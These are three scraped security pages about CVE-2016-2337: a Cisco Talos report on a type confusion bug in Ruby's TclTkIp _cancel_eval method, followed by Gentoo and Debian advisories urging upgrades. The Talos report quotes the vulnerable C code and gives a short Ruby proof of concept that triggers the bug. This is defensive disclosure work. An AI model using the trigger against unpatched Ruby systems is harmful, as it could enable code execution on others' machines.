=== Content from www.talosintelligence.com_c532146e_20250125_202328.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

Ã—

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2016-0031

## Ruby TclTkIp ip\_cancel\_eval Type Confusion Vulnerabilities

##### June 14, 2016

##### CVE Number

CVE-2016-2337

### DESCRIPTION

Type Confusion exists in \_cancel\_eval Rubyâ€™s TclTkIp class method. Attacker passing different type of object than String
as â€œretvalâ€ argument can cause arbitrary code execution.

### TESTED VERSIONS

Ruby 2.3.0 dev
Ruby 2.2.2
Tcl/Tk8.6 or later

### PRODUCT URLs

https://www.ruby-lang.org

### DETAILS

Vulnerable code:

```
---------------------------------------------- code
---------------------------------------------
Line 7761	static VALUE
Line 7762	ip_cancel_eval(argc, argv, self)
Line 7763	int   argc;
Line 7764	VALUE *argv;
Line 7765	VALUE self;
Line 7766	{
Line 7767		VALUE retval;
Line 7768
Line 7769		if (rb_scan_args(argc, argv, "01", &retval) == 0) {
Line 7770			retval = Qnil;
Line 7771		}
Line 7772		if (ip_cancel_eval_core(get_ip(self)->ip, retval, 0) ==
TCL_OK) {
Line 7773			return Qtrue;
Line 7774		} else {
Line 7775			return Qfalse;
Line 7776		}
Line 7777	}

Line 7736	static int
Line 7737	ip_cancel_eval_core(interp, msg, flag)
Line 7738	Tcl_Interp *interp;
Line 7739	VALUE msg;
Line 7740	int flag;
Line 7741	{
Line 7742	#if TCL_MAJOR_VERSION < 8 || (TCL_MAJOR_VERSION == 8 &&
TCL_MINOR_VERSION < 6)
Line 7743		rb_raise(rb_eNotImpError,
Line 7744				 "cancel_eval is supported Tcl/Tk8.6 or
later.");
Line 7745
Line 7746		UNREACHABLE;
Line 7747	#else
Line 7748		Tcl_Obj *msg_obj;
Line 7749
Line 7750		if (NIL_P(msg)) {
Line 7751			msg_obj = NULL;
Line 7752		} else {
Line 7753			msg_obj = Tcl_NewStringObj(RSTRING_PTR(msg),
RSTRING_LEN(msg));
Line 7754			Tcl_IncrRefCount(msg_obj);
Line 7755		}
Line 7756
Line 7757		return Tcl_CancelEval(interp, msg_obj, 0, flag);
Line 7758	#endif
Line 7759	}
---------------------------------------------- code
---------------------------------------------

```

In line 7769 â€œ\_cancel\_evalâ€ method argument is parse out into â€œretvalâ€ variable. Next this variable is passed to
â€œip\_cancel\_eval\_coreâ€ function (line 7772). In line 7753 we can see that our â€œretvalâ€ variable which in this function is passed as â€œmsgâ€ argument is
treated as String object.Passing object different than String we will cause type confusion vulnerability in this line.

### POC

```
---------------------------------- PoC test.rb ----------------------------------------

require 'tk'
t = TclTkIp.new()
t._cancel_eval(0x11223344)

---------------------------------- PoC test.rb ----------------------------------------

```
### TIMELINE

2015-06-18 - Initial Discovery

2015-06-30 - Vendor Notification

2016â€”06-14 - Public Disclosure

##### Credit

Discovered by Marcin â€˜Icewallâ€™ Noga of Cisco Talos

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2016-0032](/vulnerability_reports/TALOS-2016-0032) [Previous Report

TALOS-2016-0029](/vulnerability_reports/TALOS-2016-0029)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

Â©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)



=== Content from security.gentoo.org_eb4628ed_20250125_202329.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Ruby: Multiple vulnerabilities â€” GLSA **201710-18**

Multiple vulnerabilities have been found in Ruby, the worst of
which could lead to the remote execution of arbitrary code.

### Affected packages

| Package | **dev-lang/ruby** on all architectures |
| --- | --- |
| Affected versions | < **2.2.8** |
| Unaffected versions | >= **2.2.8** |

### Background

Ruby is an interpreted object-oriented programming language. The
elaborate standard library includes an HTTP server (â€œWEBRickâ€) and a
class for XML parsing (â€œREXMLâ€).

### Description

Multiple vulnerabilities have been discovered in Ruby. Please review the
referenced CVE identifiers for details.

### Impact

A remote attacker could execute arbitrary code, cause a Denial of
Service condition, or obtain sensitive information.

### Workaround

There is no known workaround at this time.

### Resolution

All Ruby users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-lang/ruby-2.2.8"

```
### References

* [CVE-2016-2337](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-2337)
* [CVE-2017-0898](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2017-0898)
* [CVE-2017-10784](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2017-10784)
* [CVE-2017-14033](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2017-14033)
* [CVE-2017-14064](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2017-14064)

**Release date**

October 18, 2017

**Latest revision**

October 18, 2017: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [605536](https://bugs.gentoo.org/show_bug.cgi?id=605536)
* [629484](https://bugs.gentoo.org/show_bug.cgi?id=629484)
* [631034](https://bugs.gentoo.org/show_bug.cgi?id=631034)

### Questions or comments?

Please feel free to contact us.

**Â© 2001â€“2020 Gentoo Foundation, Inc.**



=== Content from lists.debian.org_4f3bdbf8_20250125_202329.html ===


---

[[Date Prev](msg00027.html)][[Date Next](msg00029.html)]
[[Thread Prev](msg00027.html)][[Thread Next](msg00029.html)]
[[Date Index](maillist.html#00028)]
[[Thread Index](threads.html#00028)]

# [SECURITY] [DLA 1480-1] ruby2.1 security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 1480-1] ruby2.1 security update
* *From*: Antoine BeauprÃ© <anarcat@debian.org>
* *Date*: Mon, 27 Aug 2018 16:25:50 -0400
* *Message-id*: <[[ðŸ”Ž]](/msgid-search/20180827202550.GA20085%40curie.anarc.at)Â [20180827202550.GA20085@curie.anarc.at](msg00028.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
Package        : ruby2.1
Version        : 2.1.5-2+deb8u5
CVE ID         : CVE-2016-2337 CVE-2018-1000073 CVE-2018-1000074
Debian Bug     : 895778 851161

Several vulnerabilities were discovered in Ruby 2.1.

CVE-2016-2337

    Type confusion exists in _cancel_eval Ruby's TclTkIp class
    method. Attacker passing different type of object than String as
    "retval" argument can cause arbitrary code execution.

CVE-2018-1000073

    RubyGems contains a Directory Traversal vulnerability in
    install_location function of package.rb that can result in path
    traversal when writing to a symlinked basedir outside of the root.

CVE-2018-1000074

    RubyGems contains a Deserialization of Untrusted Data
    vulnerability in owner command that can result in code
    execution. This attack appear to be exploitable via victim must
    run the `gem owner` command on a gem with a specially crafted YAML
    file.

For Debian 8 "Jessie", these problems have been fixed in version
2.1.5-2+deb8u5.

We recommend that you upgrade your ruby2.1 packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

```

**Attachment:
[signature.asc](pgpvo6rJlwmp2.pgp)**

*Description:* PGP signature

---


